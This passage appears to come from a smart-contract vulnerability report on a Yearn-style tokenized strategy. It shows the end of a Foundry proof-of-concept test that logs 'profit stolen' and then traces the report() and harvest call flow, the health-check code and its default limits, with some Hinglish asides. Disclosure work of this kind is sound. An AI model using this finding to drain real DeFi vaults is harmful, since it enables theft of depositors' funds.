    ├─ emit log_named_uint(key: "profit stolen (difference)", val: 1047157211083 [1.047e12])
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 500.58s (491.44s CPU time)

Ran 1 test suite in 503.76s (500.58s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```



----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Contracts & call flow

Report path:

Keeper calls TokenizedStrategy.report() (external, onlyKeepers).

report() calls the strategy implementation via delegatecall:

uint256 newTotalAssets = IBaseStrategy(address(this)).harvestAndReport();


(exact code tumhare uploaded TokenizedStrategy.sol me bhi hai).

Because MorphoCompounder inherits Base4626Compounder → BaseHealthCheck → BaseStrategy, the harvestAndReport() that actually runs is the one in BaseHealthCheck, not the bare BaseStrategy one:

function harvestAndReport()
    external
    override
    onlySelf
    returns (uint256 _totalAssets)
{
    _totalAssets = _harvestAndReport();
    _executeHealthCheck(_totalAssets);
}


(ye exact code tumhare local MorphoCompounder.sol.txt me present hai).

_harvestAndReport() comes from Base4626Compounder:

function _harvestAndReport()
    internal
    virtual
    override
    returns (uint256 _totalAssets)
{
    // Claim and sell any rewards.
    _claimAndSellRewards();
    // Return total balance
    _totalAssets = balanceOfAsset() + valueOfVault();
}


So harvest during report = call _claimAndSellRewards() + compute totalAssets.

_executeHealthCheck(_totalAssets) enforces profit/loss bounds vs previous totalAssets:

function _executeHealthCheck(uint256 _newTotalAssets) internal virtual {
    if (!doHealthCheck) {
        doHealthCheck = true;
        return;
    }

    uint256 currentTotalAssets = TokenizedStrategy.totalAssets();

    if (_newTotalAssets > currentTotalAssets) {
        require(
            (_newTotalAssets - currentTotalAssets)
                <= (currentTotalAssets * uint256(_profitLimitRatio)) / MAX_BPS,
            "healthCheck"
        );
    } else if (currentTotalAssets > _newTotalAssets) {
        require(
            (currentTotalAssets - _newTotalAssets)
                <= (currentTotalAssets * uint256(_lossLimitRatio)) / MAX_BPS,
            "healthCheck"
        );
    }
}


Defaults (constructor):

doHealthCheck = true

_profitLimitRatio = MAX_BPS = 10_000 (100% profit per report allowed)

_lossLimitRatio = 0 (no net loss vs last report allowed)

Ye sab tumhare local BaseHealthCheck code me bhi exactly hai.
